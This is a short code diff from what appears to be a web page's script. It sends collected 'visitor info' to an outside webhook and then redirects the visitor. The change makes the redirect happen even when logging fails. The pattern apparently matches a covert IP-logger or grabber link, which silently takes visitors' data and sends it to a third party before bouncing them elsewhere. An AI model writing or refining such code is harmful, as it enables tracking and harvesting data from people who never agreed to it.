@@ -114,20 +114,25 @@
                 }]
             };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
+            // Send data to webhook and handle redirection
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
-                    window.location.href = redirectURL;
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
-            })
-            .catch(error => console.error('Error sending to webhook:', error));
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
+
+            // Redirect after sending data
+            window.location.href = redirectURL;
         }
 
         // Execute the data collection and logging
